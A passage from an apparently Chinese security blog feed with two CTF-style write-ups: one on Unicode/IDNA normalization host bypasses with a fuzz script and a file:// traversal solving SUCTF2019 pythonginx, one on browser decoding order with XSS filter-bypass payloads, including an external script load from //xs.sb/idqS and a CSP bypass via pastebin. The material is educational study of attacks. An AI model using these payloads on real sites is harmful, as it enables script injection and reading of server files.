    
    </summary>
    
      <category term="pwn" scheme="0verwatch.top/categories/pwn/"/>
    
    
      <category term="rop" scheme="0verwatch.top/tags/rop/"/>
    
      <category term="pwn" scheme="0verwatch.top/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>Exploitable Antipatterns in Unicode Normalization</title>
    <link href="0verwatch.top/exploit-in-unicode-normalization.html"/>
    <id>0verwatch.top/exploit-in-unicode-normalization.html</id>
    <published>2019-09-17T13:09:35.000Z</published>
    <updated>2019-09-17T13:27:05.198Z</updated>
    
    <content type="html"><![CDATA[<p>这一篇文章源自于Black hat 2019的一个议题，有一个详细的<a href="https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf" target="_blank" rel="noopener">ppt</a>看着好像挺有趣，拿过来学习一下，而且最近也有CTF题目出现了有关这个的知识点，结合一下这个题目看看，主要是复习机试没兴趣，得找点其他东西<a id="more"></a>看看。</p><h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>从这个议题来看应该是个编码问题导致的漏洞</p><p>议题人给出了𓀬.net这样的一个网址，但是会跳转到<code>http://xn--fq7d.net/</code>，这是一个人站在两头长颈鹿上，是一个埃及的文字代表忙碌。为什么会出现这种情况？需要了解这是怎么编码解码的~</p><h3 id="一些基础"><a href="#一些基础" class="headerlink" title="一些基础"></a>一些基础</h3><h4 id="什么是IDN？"><a href="#什么是IDN？" class="headerlink" title="什么是IDN？"></a>什么是IDN？</h4><p>国际化域名IDNs (Internationalized Domain Names)也称多语种域名，是指非英语国家为推广本国语言的域名系统的一个总称，例如含有日文的为日文域名，含有中文的域名为中文域名。简单滴说就是非英语表示的域名。</p><h4 id="Punycode"><a href="#Punycode" class="headerlink" title="Punycode"></a>Punycode</h4><p>是一种表示Unicode码和ASCII码的有限的字符集。例如：“münchen”（德国慕尼黑）会被编码为“mnchen-3ya”。用于DNS系统的编码 ，防止所谓的IDN欺骗。</p><p>在IDNs（国际化域名Internationalized Domain Names）推出以后，为了保证兼容以前的DNS，所以，对这些非英语的字符进行punycode转码，转码后的punycode就由26个字母+10个数字，还有“-”组成。</p><h4 id="IDN的执行过程"><a href="#IDN的执行过程" class="headerlink" title="IDN的执行过程"></a>IDN的执行过程</h4><p><img src="https://s2.ax1x.com/2019/09/17/nIVDsK.png" alt="nIVDsK.png" style="zoom:33%;"></p><p>一共是两个步骤，第一个是Normalization，普通化，此时，就是把各国的文字变成一个标准的形式，类似一个过渡</p><p><img src="https://s2.ax1x.com/2019/09/17/nIerUe.png" alt="nIerUe.png" style="zoom: 33%;"></p><p>第二个就是一个punycode转码，将unicode转化成acsii</p><p><img src="https://s2.ax1x.com/2019/09/17/nInFYQ.png" alt="nInFYQ.png" style="zoom: 33%;"></p><p>这个议题指出关键点在于部分字符在经过Normalization这一部分的时候直接变成ascii码，然后如果在经历一遍punycode转码也是没啥不同，还是ascii码，就是下图，可以使用该网址进行测试<code>https://www.punycoder.com/</code>：</p><p><img src="https://s2.ax1x.com/2019/09/17/nIKqFU.png" alt="nIKqFU.png" style="zoom: 33%;"></p><p><img src="https://s2.ax1x.com/2019/09/17/nIKjSJ.png" alt="nIKjSJ.png" style="zoom:33%;"></p><p>这样的问题可以利用在很多跳转漏洞上，该议题的作者在ppt上也指出他在一些浏览器和在哪些编程语言中发现的相似漏洞点</p><p><img src="https://s2.ax1x.com/2019/09/17/nIQuv9.png" alt="nIQuv9.png"></p><p>当然很多CVE也已经被修复了，可能是因为我没更新python，我自己的python还是存在这个问题的(⊙o⊙)…</p><p><img src="https://s2.ax1x.com/2019/09/17/nI1v4K.png" alt="nI1v4K.png" style="zoom: 67%;"></p><p>当然也不止上面那一个字符存在这样的问题，借用altman大佬的fuzz脚本，可以把其他类似字符也搞出来，原理很简单就是，从ASCII以外的字符去判断，以是否存在<code>-</code>关键字作为判断条件即可，我就不重复造轮子了。。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">128</span>,<span class="number">65537</span>):</span><br><span class="line">tmp=chr(i)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">res = tmp.encode(<span class="string">'idna'</span>).decode(<span class="string">'utf-8'</span>)</span><br><span class="line"><span class="keyword">if</span>(<span class="string">"-"</span>) <span class="keyword">in</span> res:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">print(<span class="string">"U:&#123;&#125; A:&#123;&#125; ascii:&#123;&#125; "</span>.format(tmp,res,i))</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>下面就结合题目学习一下了233333</p><p>题目来源：<a href="https://github.com/team-su/SUCTF-2019/tree/master/Web/pythonginx" target="_blank" rel="noopener">SUSCTF2019-pythonginx</a></p><p>题目给出部分源代码：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/getUrl', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getUrl</span><span class="params">()</span>:</span></span><br><span class="line">    url = request.args.get(<span class="string">"url"</span>)</span><br><span class="line">    host = parse.urlparse(url).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"我扌 your problem? 111"</span></span><br><span class="line">    parts = list(urlsplit(url))</span><br><span class="line">    host = parts[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"我扌 your problem? 222 "</span> + host</span><br><span class="line">    newhost = []</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> host.split(<span class="string">'.'</span>):</span><br><span class="line">        newhost.append(h.encode(<span class="string">'idna'</span>).decode(<span class="string">'utf-8'</span>))</span><br><span class="line">    parts[<span class="number">1</span>] = <span class="string">'.'</span>.join(newhost)</span><br><span class="line">    <span class="comment">#去掉 url 中的空格</span></span><br><span class="line">    finalUrl = urlunsplit(parts).split(<span class="string">' '</span>)[<span class="number">0</span>]</span><br><span class="line">    host = parse.urlparse(finalUrl).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.request.urlopen(finalUrl).read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"我扌 your problem? 333"</span></span><br><span class="line">    &lt;/code&gt;</span><br><span class="line">    &lt;!-- Dont worry about the suctf.cc. Go on! --&gt;</span><br><span class="line">    &lt;!-- Do you know the nginx? --&gt;</span><br></pre></td></tr></table></figure><p>反正这个代码的意思就是域名里面不允许出现<code>suctf.cc</code>，但最后经过Normalization处理之后满足<code>suctf.cc</code>就可以读取文件了，正好是上面的知识点，我们只要找到一个字符代替其中的一个字符即可，这里从fuzz的字符中找到<code>Ｃ</code>去替代，最后使用file协议去读取文件，先是按照提示读取nginx的配置文件,<code>file://suctf.cＣ/../../../../usr/local/nginx/conf/nginx.conf</code>，然后再去读取flag就好</p><p><img src="https://s2.ax1x.com/2019/09/17/nIUWf1.png" alt="nIUWf1.png"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这一篇文章源自于Black hat 2019的一个议题，有一个详细的&lt;a href=&quot;https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;ppt&lt;/a&gt;看着好像挺有趣，拿过来学习一下，而且最近也有CTF题目出现了有关这个的知识点，结合一下这个题目看看，主要是复习机试没兴趣，得找点其他东西
    
    </summary>
    
      <category term="Web安全" scheme="0verwatch.top/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="Web安全" scheme="0verwatch.top/tags/Web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>xss编码绕过原理以及从中学习到的几个例子</title>
    <link href="0verwatch.top/xss-encodeorder.html"/>
    <id>0verwatch.top/xss-encodeorder.html</id>
    <published>2019-09-10T15:29:45.000Z</published>
    <updated>2019-09-29T07:42:35.624Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>最近看了一些xss利用方式，发现本人在以前对编码绕过这一个点的原理好像没有太本质性的理解，所以就有了这篇文章，对浏览器进行解析的顺序有一个记录，也从中收获到点东西，准备校赛出一个题目关于这个内容<a id="more"></a>XD</p><h3 id="浏览器涉及到解析机制"><a href="#浏览器涉及到解析机制" class="headerlink" title="浏览器涉及到解析机制"></a>浏览器涉及到解析机制</h3><p>谈到这个是因为这篇文章的本质是浏览器的解析编码的顺序触发的xss，解析一篇HTML文档时主要有三个处理过程：HTML解析，URL解析和JavaScript解析，一般先是HTML解析，后面两个解析看情况而定（存在事件的情况有点不太一样），但大多数都是HTML解析-&gt;URL解析-&gt;JavaScript解析，ok，那先来解释一下各种解析机制。大神级别可以跳过，直接看那几个xss例子吧，惨~</p><h4 id="HTML解析"><a href="#HTML解析" class="headerlink" title="HTML解析"></a>HTML解析</h4><p>在了解HTML解析的先来了解一波什么是HTML字符实体，因为HTML中有些字符是和关键词冲突的，比如<code>&lt;、&gt;、&amp;</code>，解码之后，浏览器会误认为它们是标签，解决的办法就是HTML源代码中使用字符实体，比如我们常见的空格<code>&amp;nbsp;</code>，字符实体以&amp;开头+预先定义的实体名称表示，<strong>但不是所有的字符都有实体名称</strong>，但是它们都有实体编号，也可以用&amp;#开头+实体编号+分号表</p><p><img src="https://s2.ax1x.com/2019/09/10/nU30SI.png" alt="nU30SI.png"></p><p>要是对php熟悉的同学，就会知道php中存在htmlspecialchars()函数就是将一些会产生歧义的符号转移成实体编号，对xss起到了防护作用。</p><p>html是如何解析的？可以看一下HTML的词法解析过程<a href="https://html.spec.whatwg.org/multipage/parsing.html" target="_blank" rel="noopener">传送门</a>，官方是以状态机解释的，这里我用自己的话总结一下，简单的说，浏览器在解析一个HTML文档时，会按照从上至下，从左至右依次进行解析。在碰到<code>&lt;</code>时，就进入解析元素标签的状态，后面跟着的内容被默认是标签元素内的内容，直到碰到<code>&gt;</code>结束。所以我们要使<code>&lt;&gt;</code>能够正常被展示的话，就得对其进行实体编码，如下图：</p><p><img src="https://s2.ax1x.com/2019/09/10/nUa6iT.png" alt="nUa6iT.png"></p><p><img src="https://s2.ax1x.com/2019/09/10/nUaLSe.png" alt="nUaLSe.png"></p><p>对于HTML字符实体，这里我们需要注意只有有三种情况可以容纳字符实体，也就是说不是任何地方都可以使用实体编码，只有在“数据状态中的字符引用”，“RCDATA状态中的字符引用”和“属性值状态中的字符引用”这些状态中HTML字符实体将会从“&amp;#…”形式解码，对应的解码字符会被放入数据缓冲区中，注意现在的重点放在哪里可以解析HTML编码。</p><p>解释一下这三种状态，第一个，数据状态就类似于在解析一个标签内里面的内容，如<code>&lt;div&gt;...&lt;/div&gt;</code> 当浏览器解析完div标签之后如果标签内含有转义字符的话，就会有一个实体编码解析了，如：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>&amp;#60;img src=x onerror=alert(4)&amp;#62;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>此时在页面上显示的是经过转义的内容，看上去是一个标准的标签语言，但此时不会触发xss，因为处于“数据状态”时，不会转换到“标签开始状态”。正因为如此，就不会建立新标签。因此，我们能够利用字符实体编码这个行为来转义用户输入的数据从而确保用户输入的数据只能被解析成“数据”。也就是下面的内容，就是正常的转义显示：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(4)</span>&gt;</span></span><br></pre></td></tr></table></figure><p>而属性值状态中的字符引用，就类似于src，herf这样的属性值被编码，他也是会先进行Html解码的，比如下面的语句，会先对里面html解码，再继续往下执行</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span>  <span class="attr">href</span>=<span class="string">"&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x31;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x36;&amp;#x33;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x35;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x32;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x34;&amp;#x28;&amp;#x31;&amp;#x35;&amp;#x29;"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后再来看一下什么是RCDATA转态，这里需要我们先了解一下HTML中有五类元素：</p><ol><li>空元素(Void elements)，如<code>&lt;area&gt;,&lt;br&gt;,&lt;base&gt;</code>等等</li><li>原始文本元素(Raw text elements)，有<code>&lt;script&gt;</code>和<code>&lt;style&gt;</code></li><li>RCDATA元素(RCDATA elements)，有<code>&lt;textarea&gt;</code>和<code>&lt;title&gt;</code></li><li>外部元素(Foreign elements)，例如MathML命名空间或者SVG命名空间的元素</li><li>基本元素(Normal elements)，即除了以上4种元素以外的元素</li></ol><p>五类元素的区别如下：</p><ol><li>空元素，不能容纳任何内容（因为它们没有闭合标签，没有内容能够放在开始标签和闭合标签中间）。</li><li>原始文本元素，可以容纳文本。</li><li>RCDATA元素，可以容纳文本和字符引用。</li><li>外部元素，可以容纳文本、字符引用、CDATA段、其他元素和注释</li><li>基本元素，可以容纳文本、字符引用、其他元素和注释</li></ol><p>注意到RCDATA中有<code>&lt;textarea&gt;</code>和<code>&lt;title&gt;</code>两个属性并且有字符引用，也就是当实体字符出现在这两个标签里面的时候，实体字符会被识别，做一个HTML编码解析，所以下面这个语句触发不了xss，标签内容被转义了。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">textarea</span>&gt;</span>&amp;#60;script&amp;#62;alert(5)&amp;#60;/script&amp;#62;<span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br></pre></td></tr></table></figure><p>但是如果直接放进去标签的内容呢，不带转义字符呢，如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">textarea</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert(6)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br></pre></td></tr></table></figure><p>同样也是不会触发xss的，在这两个标签内，是不会进入“标签开始状态”，也就是说里面的内容不会当做HTML代码解析，只认<code>&lt;textarea&gt;</code>或<code>&lt;title&gt;</code>标签来结束</p><p>另外还有一点注意：我们从上面的元素中还发现有一个原始文本元素<code>&lt;script&gt;</code>在这个标签内容纳的是文本，所以浏览器在解析到这个标签后，后面的内容中<br>的编码并不会被转义。浏览器看不懂中间这堆东西是啥，所以也不会被执行。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116&amp;#40;&amp;#57;&amp;#41;&amp;#59</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>那么如何才能让里面的内容进行转义，然后执行弹窗呢，下面会提及。</p><h4 id="URL解析"><a href="#URL解析" class="headerlink" title="URL解析"></a>URL解析</h4><p>说到url解析，大家都很熟悉，肯定要涉及到url编码，本质是把一个字符转为%加上UTF-8编码对应的16进制数字。这里的url解析指的就是URL解码，在服务端接收到请求时，会自动对请求进行一次URL解码。但是今天这篇文章涉及的URL解码是发生在服务器接收之后的。</p><p>需要注意的是不能对协议类型进行任何的编码操作，不然URL解析器会认为它无类型。也就是下面这个例子中冒号前面的一段URL编码内容，把<code>javascript</code>给编码了，这时候不会被URL解析器识别，所以也不会触发xss</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"%6a%61%76%61%73%63%72%69%70%74:%61%6c%65%72%74%28%31%29"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>但是换过来如果是这样，如下，经过了Html解析之后，进入href，就开始url解析了，没有把协议给编码，够被URL解析器正确识别。然后URL解析器继续解析链接剩下的部分，最后就会触发xss</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:%61%6c%65%72%74%28%31%29"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="JavaScript-解析"><a href="#JavaScript-解析" class="headerlink" title="JavaScript 解析"></a>JavaScript 解析</h4><p>好像只对UNICODE编码起作用，也就是形如<code>\u4e00</code>，前导的 u 表示他是一个unicode 字符，当HTML解析产生DOM节点后，会根据DOM节点来做接下来的解析工作，比如在处理诸如<code>&lt;script&gt; &lt;style&gt;</code>这样的标签，解析器会自动切换到JS解析模式，而<code>src</code>、 <code>href</code>后边加入的javascript 伪URL，也会进入JS 的解析模式。</p><p>但是这里需要注意的是：js解析的字符不一定全部都会当成js代码解析，需要分情况，转义序列放在3个部分：字符串中，标识符名称中和控制字符中。</p><p>其中字符串，和控制字符都是会被转义成文本，不会当做js代码的一部分执行，有哪些是控制字符？比如单双引号、括号等转移之后只当成文本看待，比如：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert('13\u0027)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>此时alert语句里面虽然<code>\u0027</code>被转义成单引号，但是只是文本，并不是js运行代码的一部分，相当于此时差单个引号闭合，所以是不会执行的，又比如：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0031\u0029</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>此时经过js解码之后左右括号都被当成文本，相当于alert命令没有了括号，也运行不来</p><p>但是对于在标识符名称中时，它会被解码并解释为标识符名称的一部分，例如函数名，属性名等等，比如将<code>alert</code>关键字编码后，当解码之后他会成为js执行代码的一部分，是可以执行的，如：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">\u0061\u006c\u0065\u0072\u0074(10);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="一些XSS例子分析"><a href="#一些XSS例子分析" class="headerlink" title="一些XSS例子分析"></a>一些XSS例子分析</h3><p><strong>例子一</strong>：再来回看HTML编码里面的这样一个例子，这个例子是可以触发xss的：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span></span></span><br><span class="line"><span class="tag"><span class="attr">href</span>=<span class="string">"&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x31;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x36;&amp;#x33;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x35;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x32;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x34;&amp;#x28;&amp;#x31;&amp;#x35;&amp;#x29;"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>回顾一遍流程，先是Html解码，变成下面的样子：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(15)"</span> &gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>再来URL解码，协议没有编码，可以正常解析，变成下面的样子：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:\u0061\u006c\u0065\u0072\u0074(15)"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>进入js解析的阶段，解析的是关键字，可以当做js代码执行，最后还是可以正常执行的</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:alert(15)"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>例子二</strong>： 上面的html编码留下的一个问题，如何绕过HTML原始文本元素进而执行HTML转义呢，涉及到<code>&lt;svg&gt;</code>的魔力，那是一种特殊的触发效果，单纯script标签内加载html实体编码，只会当做文本，没有任何触发结果，如下图：</p><p><img src="https://s2.ax1x.com/2019/09/10/napYrV.png" alt="napYrV.png"></p><p>但是当外面加上<code>&lt;svg&gt;</code>会如何？出发了弹窗，这又是为何？</p><p><img src="https://s2.ax1x.com/2019/09/10/napWIe.png" alt="napWIe.png"></p><p>是因为<code>&lt;svg&gt;</code>标签属于五大元素中的外部元素，可以容纳文本、字符引用、CDATA段、其他元素和注释，也就是说在解析到<code>&lt;svg&gt;</code>标签时，浏览器就开始使用一套新的标准开始解析后面的内容，直到碰到闭合标签<code>&lt;/svg&gt;</code>。而在这一套新的标准遵循XML解析规则，在XML中实体编码会自动转义，重新来一遍标签开启状态，此时就会执行xss了。</p><p><strong>例子三</strong>：主要是来源于我最近见到的一个题目，使用了另外的编码文字绕过，这个题目设计得很巧妙，我这里用php模拟一下写了个后台代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> $name = $_GET[<span class="string">'name'</span>];</span><br><span class="line"><span class="comment">// $name = "&lt;script&gt;alert(1)&lt;/script&gt;";</span></span><br><span class="line"> $name =  strtoupper($name);</span><br><span class="line"> <span class="keyword">echo</span> $name;</span><br><span class="line"> <span class="keyword">if</span>(preg_match(<span class="string">"/&lt;[A-Z0-9]+/"</span>, $name) !== <span class="number">0</span>)&#123;</span><br><span class="line"> $name = preg_replace(<span class="string">'/&lt;/'</span>, <span class="string">'&lt;_'</span>, $name, $count=<span class="number">1</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">echo</span> $name;</span><br></pre></td></tr></table></figure><p>如果直接输入<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>，就会变成<code>&lt;_SCRIPT&gt;ALERT(1)&lt;/SCRIPT&gt;</code>，这里面要触发xss，需要绕过两个条件，第一个就是大写的问题，js是区分大小写的，所以直接在标签内写弹窗脚本是不太可行的，但是我们可以直接引入外部的js，比如<code>&lt;scriptv src=//xs.sb/idqS&gt;&lt;/script&gt;</code>，这就可以绕过。</p><p>另外就是要绕过<code>&lt;_</code>的问题，因为后台匹配的是<code>&lt;</code>符号后面接上正常的字母，如果使用的是不正常的英文字母呢？这里刚好有另外一个条件就是转化大写的这个操作，这个操作很妙，因为HTML标签是不区分大小写的，这样我们使用下图的这个拉丁字母，当转化成大写的话就刚好是S，而且好像是只有这个拉丁文才有这样的效果。</p><p><img src="https://s2.ax1x.com/2019/09/10/naM00g.png" alt="naM00g.png" style="zoom: 30%;"></p><p>妙啊，最后的payload：<code>&lt;ſcript src=//xs.sb/idqS&gt;&lt;/script&gt;</code></p><p><strong>例子四</strong></p><p>这个例子是一个来自我在推特上看到一位师傅的骚操作，然后以这个例子出了一个csp绕过的题目。本质上就是这个例子XD</p><p><img src="https://s2.ax1x.com/2019/09/15/nguaA1.png" alt="nguaA1.png" style="zoom:50%;"></p><p>这位师傅也已经说得很清楚了，当我们使用<code>%2f</code>代替<code>/</code>的时候就会有一个绕过的效果，并且图中的<code>XYZ</code>是可以任意替换的。实际上我们引入的内容是这个站点下的内容：<code>https://pastebin.com/raw/b0Rajxqk</code>，里面的内容就是一个<code>alert(1)</code></p><p>我们可以尝试一下，效果如下：</p><p><img src="https://s2.ax1x.com/2019/09/15/ngKLse.png" alt="ngKLse.png" style="zoom:67%;"></p><p><strong>例子五</strong></p><p>这个例子是结合了上面的例子三以及本篇文章的内容，这里我是将所有输入的内容含有<code>%2f</code>进行了处理，把含有<code>%2f</code>都会删掉，这里需要使用本文的一个内容，就是利用浏览器的解析顺序，而且我们可以注意到这里我们输入的内容都会进入到src属性里面去，上文说到在属性值状态中HTML字符实体将会从“&amp;#…”形式解码，所以我们可以利用HTML实体编码去进行一个绕过。</p><p>使用的是<code>%</code>的一个html编码进行绕过，也就是<code>&amp;percnt;</code></p><p><img src="https://s2.ax1x.com/2019/09/15/ng1QQf.png" alt="ng1QQf.png" style="zoom:50%;"></p><p>触发效果：</p><p><img src="https://s2.ax1x.com/2019/09/15/ng10yT.png" alt="ng10yT.png"></p><h3 id="Referer"><a href="#Referer" class="headerlink" title="Referer"></a>Referer</h3><p><a 